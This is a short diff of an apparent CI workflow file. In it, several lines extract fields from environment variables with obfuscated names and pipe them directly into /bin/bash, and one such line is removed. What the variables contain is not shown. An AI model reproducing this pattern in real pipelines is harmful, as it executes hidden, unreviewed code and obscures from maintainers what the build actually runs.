@@ -28,7 +28,6 @@ jobs:
           echo $rk134 | jq -r .anmqe33462 | /bin/bash
           echo $nkrxs59 | jq -r .krewu221 | /bin/bash
           echo $v1603 | jq -r .fmwf88535 | /bin/bash
-          echo $emmx307 | jq -r .x6 | /bin/bash
           printf '%s' "$fex812" | jq -r .gmml491 | /bin/bash
 
       - name: Save data
